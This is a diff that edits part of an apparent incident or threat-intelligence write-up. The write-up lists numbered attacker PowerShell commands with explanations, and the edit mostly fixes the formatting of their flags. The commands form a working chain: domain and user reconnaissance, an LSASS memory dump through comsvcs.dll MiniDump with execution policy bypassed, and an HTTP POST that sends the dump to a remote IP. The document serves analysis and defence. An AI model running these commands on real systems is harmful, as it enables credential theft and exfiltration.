@@ -76,27 +76,27 @@ sc -path c:\inetpub\wwwroot\aspnet_client\test.txt – value teset
 This command overwrites the “test.txt” file content to “teset”.
 
 PowerShell command n° 8
-powershell.exe – noninteractive – executionpolicy bypass ipconfig /all
+powershell.exe –noninteractive –executionpolicy bypass ipconfig /all
 This command outputs the network configuration of the current machine.
 
 PowerShell command n° 9
-powershell.exe – noninteractive – executionpolicy bypass net group ‘domain admins’ /domain
+powershell.exe –noninteractive –executionpolicy bypass net group ‘domain admins’ /domain
 This command lists the members of the “domain admins” group.
 
 PowerShell command n° 10
-powershell.exe – noninteractive – executionpolicy bypass quser
+powershell.exe –noninteractive –executionpolicy bypass quser
 This command outputs information on the current user.
 
 PowerShell command n° 11
-powershell.exe – noninteractive – executionpolicy bypass ps lsass
+powershell.exe –noninteractive –executionpolicy bypass ps lsass
 This command outputs information on the local authentication service “LSASS”.
 
 PowerShell command n° 12
-powershell.exe – noninteractive – executionpolicy bypass rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 552 C:\programdata\a.zip full
+powershell.exe –noninteractive –executionpolicy bypass rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\programdata\a.zip full
 This command dumps the memory of the LSASS process for which the process ID was found running the previous command.
 
 PowerShell command n° 13
-powershell.exe "Invoke-WebRequest – Uri 10.200.10.2:80 – Method POST – Infile C:\programdata\a.zip – TimeoutSec 666 – Headers @{ Authorization = 'Basic ZGVtbzpkZW1v' }" – UseBasicParsing
+powershell.exe "Invoke-WebRequest –Uri 10.200.10.2:80 –Method POST –Infile C:\programdata\a.zip –TimeoutSec 666 –Headers @{ Authorization = 'Basic ZGVtbzpkZW1v' }" –UseBasicParsing
 This command creates an HTTP POST request to a distant server, whose body is the previously extracted LSASS dump.
 
 
